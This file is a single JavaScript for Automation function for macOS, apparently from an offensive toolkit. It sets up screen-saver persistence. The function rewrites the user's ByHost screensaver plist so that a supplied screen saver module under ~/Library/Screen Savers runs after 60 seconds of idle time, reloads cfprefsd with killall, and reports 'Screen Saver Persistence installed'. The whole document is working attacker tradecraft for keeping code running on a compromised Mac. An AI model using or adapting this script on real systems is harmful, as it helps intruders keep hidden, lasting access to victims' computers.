function ScreenSaverPersist(SaverName) {
    ObjC.import('Foundation')
    ObjC.import("Cocoa")
    ObjC.import('stdlib')
    let currentApp = Application.currentApplication();
    currentApp.includeStandardAdditions = true;
    let userHome = $.getenv('HOME')
	var output = ""

	try{

		function listDirectory(strPath) {
		var fm = $.NSFileManager.defaultManager;
        return ObjC.unwrap(
                fm.contentsOfDirectoryAtPathError($(strPath)
                    .stringByExpandingTildeInPath, null))
            .map(ObjC.unwrap);
    	}
			
		function reloadCfprefsd() {
        let path = "/usr/bin/killall"
        let args = ["-hup","cfprefsd"]
        var pipe = $.NSPipe.pipe;
        var file = pipe.fileHandleForReading;
        var task = $.NSTask.alloc.init;
        task.launchPath = path;
        task.arguments = args;
        task.standardOutput = pipe;
        task.standardError = pipe;
        task.launch;
		}

	var byHostPrefsDirectory = userHome + "/Library/Preferences/ByHost/"
	var enumerateFolderContents = listDirectory(byHostPrefsDirectory)
	
	var screenSaverplistPath = ""
		for (key in enumerateFolderContents){
	 		if (enumerateFolderContents[key].includes("com.apple.screensaver")  == true ) {
				screenSaverplistPath = enumerateFolderContents[key]
			}
		}
		
		var screenPlist = byHostPrefsDirectory + screenSaverplistPath
		var plist = $.NSMutableDictionary.alloc.initWithContentsOfFile(screenPlist)
        var unwrapScreenPlist = ObjC.deepUnwrap(plist)
		
		//Set the plist values
		unwrapScreenPlist["CleanExit"] = "YES"
		unwrapScreenPlist["PrefsVersion"] = 100
		unwrapScreenPlist["showClock"] = "NO"
		unwrapScreenPlist["idleTime"] = 60
		unwrapScreenPlist["moduleDict"]["moduleName"] = SaverName
		unwrapScreenPlist["moduleDict"]["path"] = userHome + "/Library/Screen Savers/" + SaverName
		unwrapScreenPlist["tokenRemovalAction"] = 0
		
		//save plist
    unwrapScreenPlist = $(unwrapScreenPlist)
    unwrapScreenPlist.writeToFileAtomically(screenPlist, true)
		
		reloadCfprefsd()
		output += "Screen Saver Persistence installed. Successfully modified " + screenPlist + " for Persistence"

	}catch(error){
       output += error.toString()
		}
	return output

	}
